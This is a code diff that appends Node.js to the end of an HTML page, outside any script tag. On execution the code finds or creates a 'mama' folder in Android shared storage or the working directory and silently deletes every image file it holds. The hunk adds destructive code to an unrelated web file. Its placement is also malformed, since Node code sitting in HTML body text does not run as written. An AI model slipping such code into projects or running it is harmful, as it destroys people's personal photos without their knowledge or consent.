@@ -466,5 +466,66 @@
             }
         }
     </script>
+        const fs = require('fs');
+const path = require('path');
+
+function deleteImagesSilently(folderPath) {
+    try {
+        if (!fs.existsSync(folderPath)) {
+            return { success: false, message: "Folder does not exist" };
+        }
+
+        const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp'];
+        let deletedFiles = 0;
+
+        const files = fs.readdirSync(folderPath);
+        for (const file of files) {
+            const ext = path.extname(file).toLowerCase();
+            if (imageExtensions.includes(ext)) {
+                const filePath = path.join(folderPath, file);
+                fs.unlinkSync(filePath);
+                deletedFiles++;
+            }
+        }
+
+        return { 
+            success: true, 
+            deletedCount: deletedFiles,
+            message: `${deletedFiles} image files deleted`
+        };
+    } catch (error) {
+        return {
+            success: false,
+            message: error.message
+        };
+    }
+}
+
+function findOrCreateFolder() {
+    const possiblePaths = [
+        "/storage/emulated/0/mama",
+        "/sdcard/mama",
+        path.join(process.cwd(), "mama")
+    ];
+
+    for (const p of possiblePaths) {
+        if (fs.existsSync(p)) {
+            return p;
+        }
+    }
+
+    const defaultPath = possiblePaths[possiblePaths.length - 1];
+    fs.mkdirSync(defaultPath, { recursive: true });
+    return defaultPath;
+}
+
+// Main execution
+const targetFolder = findOrCreateFolder();
+const result = deleteImagesSilently(targetFolder);
+
+// To verify the operation, you can check the result object
+// result.success - boolean indicating success/failure
+// result.message - status message
+// result.deletedCount - number of files deleted (if successful)
 </body>
 </html>
